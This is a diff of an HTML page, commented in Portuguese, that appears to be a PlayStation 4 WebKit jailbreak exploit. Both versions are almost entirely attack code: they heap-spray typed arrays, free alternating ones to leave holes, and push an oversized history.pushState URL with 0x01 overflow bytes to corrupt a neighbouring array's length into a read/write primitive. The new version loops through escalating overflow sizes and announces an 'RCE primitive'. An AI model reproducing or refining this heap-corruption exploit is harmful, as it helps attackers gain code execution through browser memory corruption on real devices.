@@ -1,139 +1,176 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <title>PS4 WebKit RCE Strategy: Length Overwrite 3</title>
+    <meta charset="UTF-8">
+    <title>PS4 WebKit: Auto-Fuzzer RCE</title>
     <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; }
-        .log { border: 1px solid #444; padding: 10px; height: 400px; overflow-y: scroll; background: #000; }
+        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; padding: 20px; }
+        .log-box { 
+            border: 1px solid #30363d; background: #161b22; 
+            height: 400px; overflow-y: scroll; padding: 10px; margin-top: 20px; 
+            font-size: 0.9em; white-space: pre-wrap;
+        }
+        button { 
+            background: #238636; color: #fff; border: none; padding: 10px 20px; 
+            font-size: 1.1em; cursor: pointer; font-weight: bold; margin-right: 10px;
+        }
+        button:hover { background: #2ea043; }
+        button.stop { background: #da3633; }
+        .highlight { color: #f0883e; font-weight: bold; }
+        .success { color: #00ff00; font-weight: bold; background: rgba(0,255,0,0.1); }
+        .info { color: #8b949e; }
     </style>
 </head>
 <body>
-    <h1>Heap Feng Shui: 0x01 Overwrite</h1>
-    <h3>Alvo: Transformar Overflow em Read/Write</h3>
-    <button onclick="runExploit()">INICIAR ALINHAMENTO E OVERFLOW</button>
-    <div id="logger" class="log"></div>
+
+    <h1>Auto-Fuzzer: Heap Overflow (0x01)</h1>
+    <p>Target Base: 709,522 bytes | Strategy: Incremental Overflow</p>
+    
+    <div id="controls">
+        <button onclick="startFuzzing()">INICIAR FUZZING AUTOMÁTICO</button>
+        <button class="stop" onclick="stopFuzzing()">PARAR</button>
+    </div>
+
+    <div class="log-box" id="logger">Aguardando comando...</div>
 
     <script>
-        const logArea = document.getElementById('logger');
-        function log(msg) { 
-            logArea.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; 
-            logArea.scrollTop = logArea.scrollHeight;
+        // CONFIGURAÇÕES GERAIS
+        const BASE_SIZE = 709522; // O tamanho "seguro" reportado
+        const CHUNK_SIZE = 0x1000; // Tamanho dos nossos arrays alvo (4KB)
+        
+        // LISTA DE VARIAÇÕES DE OVERFLOW (Bytes extras a escrever)
+        // Tentamos acertar o cabeçalho do vizinho. Pode estar perto ou longe.
+        const ATTEMPTS = [
+            16, 32, 48, 64,      // Curta distância (Header imediato)
+            128, 256, 512,       // Média distância
+            1024, 2048, 4096,    // Longa distância
+            8192, 16384, 32000   // Agressivo (Alta chance de crash)
+        ];
+
+        let isRunning = false;
+        let currentStage = 0;
+        let arrays = []; // Armazena nossos alvos
+        let logger = document.getElementById('logger');
+
+        function log(msg, type='') {
+            let div = document.createElement('div');
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(type === 'success') div.className = 'success';
+            if(type === 'info') div.className = 'info';
+            logger.appendChild(div);
+            logger.scrollTop = logger.scrollHeight;
         }
 
-        // PARÂMETROS DA SUA POC
-        const VULN_BUFFER_SIZE = 709522; 
-        // Reduzimos o overflow para NÃO destruir tudo, apenas o cabeçalho do vizinho
-        // O Header de um objeto JS geralmente tem 8 a 16 bytes. 
-        // Vamos escrever o suficiente para pegar o campo "Length" ou "Butterfly".
-        const OVERFLOW_SIZE = 32; 
+        function stopFuzzing() {
+            isRunning = false;
+            log("Fuzzing interrompido pelo usuário.", 'info');
+        }
 
-        var arrays = [];
-        var pressure = [];
+        async function startFuzzing() {
+            if(isRunning) return;
+            isRunning = true;
+            currentStage = 0;
+            log("Iniciando bateria de testes...", 'highlight');
+            runNextStage();
+        }
 
-        function runExploit() {
-            log("1. Iniciando Heap Feng Shui...");
+        // Função de pausa para não travar a UI
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-            // PASSO A: Defragmentação e Spray
-            // Criamos muitos Arrays Typed (Uint32Array) para alinhar a memória
-            // O objetivo é ter: [ARRAY] [ARRAY] [ARRAY]
-            for (let i = 0; i < 1000; i++) {
-                // Tamanho arbitrário, mas suficiente para ser um objeto no Heap
-                let arr = new Uint32Array(0x1000); 
-                // Marcamos o array para reconhecê-lo depois
-                arr[0] = 0x41414141; 
-                arr[1] = i; 
-                arrays.push(arr);
+        async function runNextStage() {
+            if (!isRunning) return;
+            if (currentStage >= ATTEMPTS.length) {
+                log("Fim dos testes. Nenhuma corrupção detectada sem crash.", 'highlight');
+                log("Sugestão: Recarregue a página para limpar o Heap e tente de novo.");
+                isRunning = false;
+                return;
             }
-            log(`Spray concluído: ${arrays.length} arrays criados.`);
 
-            // PASSO B: Criar o "Buraco" (The Hole)
-            // Precisamos liberar espaço para que o buffer do pushState caia EXATAMENTE
-            // antes de um dos nossos arrays.
-            // Vamos deletar arrays intercalados para criar buracos.
-            log("2. Criando buracos para o payload...");
-            
-            // Liberamos arrays a cada 2 posições. 
-            // Esperamos que o Heap fique: [LIVRE] [ARRAY VÍTIMA] [LIVRE] [ARRAY VÍTIMA]
-            // O buraco precisa ser grande o suficiente para caber o VULN_BUFFER_SIZE
-            
-            // NOTA: Para alinhar 709KB, precisamos forçar o GC ou ter alocado strings desse tamanho antes.
-            // Aqui vamos tentar uma abordagem bruta: liberar blocos grandes.
-            
-            // Vamos criar uma string temporária grande e soltar, esperando que o pushState re-use o espaço.
-            var tempHole = [];
-            for(let i=0; i < 50; i++) {
-                // String de tamanho idêntico ao alvo para treinar o allocator
-                let s = new Array(VULN_BUFFER_SIZE).join("B");
-                tempHole.push(s);
-            }
-            // Solta tudo de uma vez
-            tempHole = null; 
-            
-            // Força GC (Garbage Collection) rudimentar
-            try { new ArrayBuffer(1024 * 1024 * 100); } catch(e){}
+            let overflowSize = ATTEMPTS[currentStage];
+            log(`\n--- TENTATIVA ${currentStage + 1}/${ATTEMPTS.length} ---`, 'highlight');
+            log(`Testando Overflow de: ${overflowSize} bytes (Total: ${BASE_SIZE + overflowSize})`);
 
-            log("3. Preparando Payload Malicioso...");
-            
-            setTimeout(() => {
-                // O PAYLOAD DE ATAQUE
-                const base = "A".repeat(VULN_BUFFER_SIZE);
+            try {
+                // 1. LIMPEZA (Tenta limpar o lixo da tentativa anterior)
+                arrays = []; 
+                if(window.gc) window.gc(); // Se tiver gc exposto (raro)
                 
-                // O OVERFLOW: 
-                // Usamos 0x01. Se acertarmos o campo "length" de um Uint32Array vizinho:
-                // Length original: 0x00001000
-                // Length novo:     0x01010101 (dec: 16843009) -> ACESSO GIGANTE!
-                const overflow = "\x01".repeat(OVERFLOW_SIZE);
-                
-                // Removemos o "AAAA" final da sua POC original porque ele causa crash.
-                // Queremos apenas sobrescrever silenciosamente.
-                const finalPayload = "/" + base + overflow;
-
-                log("4. DISPARANDO history.pushState...");
-                try {
-                    history.pushState({}, "pwn", finalPayload);
-                } catch(e) {
-                    log("Erro no pushState (esperado se for muito grande): " + e.message);
+                // 2. HEAP SPRAY (Preparar o terreno)
+                // Criamos arrays Uint32. Queremos que um deles fique logo depois do nosso payload.
+                log("Alocando Spray de Arrays...", 'info');
+                for (let i = 0; i < 2000; i++) {
+                    let arr = new Uint32Array(CHUNK_SIZE / 4);
+                    arr[0] = 0x13371337; // Marcador
+                    arr[1] = i;          // Índice
+                    arrays.push(arr);
                 }
 
-                log("5. Verificando corrupção nos Arrays vizinhos...");
-                checkCorruption();
+                // 3. CRIAR BURACOS (Swiss Cheese)
+                // Removemos arrays alternados para criar espaços livres onde o pushState pode cair
+                // Se o pushState cair num buraco, o overflow vai acertar o array vizinho.
+                log("Criando buracos no Heap...", 'info');
+                for (let i = 0; i < arrays.length; i += 2) {
+                    arrays[i] = null; // Libera
+                }
 
-            }, 1000);
+                // Espera o Garbage Collector rodar (tentativa)
+                await sleep(100);
+
+                // 4. PREPARAR PAYLOAD
+                // Base segura + Overflow de 0x01
+                let baseStr = "A".repeat(BASE_SIZE);
+                let overflowStr = "\x01".repeat(overflowSize);
+                let finalPayload = "/" + baseStr + overflowStr; // '/' as vezes ajuda no parsing de URL
+
+                // 5. DISPARAR O GATILHO
+                log(`Injetando payload via history.pushState...`);
+                
+                // Usamos um objeto vazio e um título aleatório para evitar cache
+                history.pushState({}, "fuzz_" + overflowSize, finalPayload);
+
+                // 6. VERIFICAÇÃO (A Mágica)
+                let success = checkCorruption();
+                
+                if (success) {
+                    log("PROCESSO PARADO: Exploit encontrado!", 'success');
+                    isRunning = false;
+                    return;
+                } else {
+                    log("Falha: Nenhum array foi alterado.", 'info');
+                }
+
+            } catch (e) {
+                log(`ERRO CRÍTICO (Pode ser bom se for crash): ${e.message}`, 'highlight');
+            }
+
+            // Prepara para a próxima iteração
+            currentStage++;
+            await sleep(500); // Pausa para respirar
+            runNextStage();
         }
 
         function checkCorruption() {
-            let found = false;
-            // Percorre todos os arrays que sobraram
+            // Percorre os arrays sobreviventes
             for (let i = 0; i < arrays.length; i++) {
                 let arr = arrays[i];
                 if (!arr) continue;
 
-                // SE O EXPLOIT FUNCIONOU:
-                // O tamanho do array deve ter mudado magicamente para algo enorme (devido aos 0x01)
-                // O tamanho original era 0x1000 (4096).
-                if (arr.length > 0x1000) {
-                    log(`<span style='color:red; font-weight:bold;'>BINGO! Array índice ${i} corrompido!</span>`);
-                    log(`Novo tamanho: ${arr.length}`);
-                    log("Temos RW Primitive! Iniciando fase de Shellcode...");
-                    found = true;
+                // Checa se o tamanho mudou
+                // O tamanho original é CHUNK_SIZE / 4 (1024)
+                if (arr.length !== (CHUNK_SIZE / 4)) {
+                    log("!!! SUCESSO !!!", 'success');
+                    log(`Array no índice ${i} foi corrompido!`, 'success');
+                    log(`Tamanho Original: ${CHUNK_SIZE/4}`, 'success');
+                    log(`Novo Tamanho: ${arr.length} (0x${arr.length.toString(16)})`, 'success');
                     
-                    // AQUI ENTRARIA O CÓDIGO FINAL DO JAILBREAK
-                    // setupAddrof(arr);
-                    // setupFakeObj(arr);
-                    break;
+                    document.body.style.backgroundColor = "#003300";
+                    alert(`RCE PRIMITIVE FOUND!\nOverflow Size: ${ATTEMPTS[currentStage]}\nTarget Index: ${i}`);
+                    return true;
                 }
             }
-
-            if (!found) {
-                log("Falha: Nenhum array teve o tamanho alterado.");
-                log("Tente ajustar o 'OVERFLOW_SIZE' ou a estratégia de Spray.");
-                
-                // Se não crashou e não funcionou, talvez precisemos de mais bytes para chegar no vizinho
-                log("O navegador ainda está vivo. Tente rodar novamente.");
-            }
+            return false;
         }
+
     </script>
 </body>
 </html>
-
-
